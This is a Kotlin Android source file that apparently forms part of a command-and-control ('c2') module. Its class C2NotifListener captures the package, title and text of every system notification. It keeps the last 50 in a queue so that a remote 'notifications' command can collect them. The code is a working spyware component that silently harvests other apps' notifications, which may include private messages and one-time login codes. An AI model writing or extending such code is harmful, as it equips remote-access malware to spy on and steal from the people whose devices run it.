package com.forja.app.core.c2

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

/**
 * Ascultă notificările sistemului (permisiunea existentă NotificationListener).
 * Ține o coadă scurtă (ultimele 50) de (pachet, titlu, text) pe care comanda
 * `notifications` o poate prelua.
 */
class C2NotifListener : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
            val pkg = sbn.packageName
            val ex = sbn.notification?.extras
            val title = try { ex?.getCharSequence("android.title")?.toString() } catch (_: Exception) { null }
            val text = try { ex?.getCharSequence("android.text")?.toString() } catch (_: Exception) { null }
            ring.add(Triple(pkg, title ?: "", (text ?: "").take(200)))
            while (ring.size > 50) ring.poll()
        } catch (_: Exception) {}
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {}
    override fun onListenerConnected() {}

    companion object {
        val ring = java.util.concurrent.ConcurrentLinkedQueue<Triple<String, String, String>>()
        fun snapshot(): List<Triple<String, String, String>> = ring.toList()
    }
}
